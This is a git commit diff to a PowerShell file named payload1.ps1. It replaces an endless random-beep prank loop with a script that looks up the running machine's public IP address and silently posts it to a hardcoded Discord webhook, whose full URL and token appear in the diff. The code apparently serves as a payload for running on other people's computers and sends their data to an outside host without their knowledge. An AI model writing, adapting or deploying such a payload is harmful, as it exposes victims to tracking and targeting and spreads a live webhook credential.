abcce4b522cc4c3887e4a4e6a927e6c0a6ed81cb
Ryan <ryanraymond2010@gmail.com>
2025-07-11 10:08:07 -0400

    Update payload1.ps1

--- payload1.ps1
+++ payload1.ps1
@@ -1,3 +1,8 @@
-while ($true) {
-   [console]::Beep((Get-Random -Minimum 400 -Maximum 2000), 3000)
-}
+$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
+$webhookUrl = "https://discord.com/api/webhooks/1389819264604569600/h2DDTTU2vhk4U12E7yzuE5miyvtzKUJLrOJVsUz970u0aEiNNVfKp8nO-RD_lniOvgoW"
+
+$body = @{
+    content = "User's public IP: $publicIP"
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
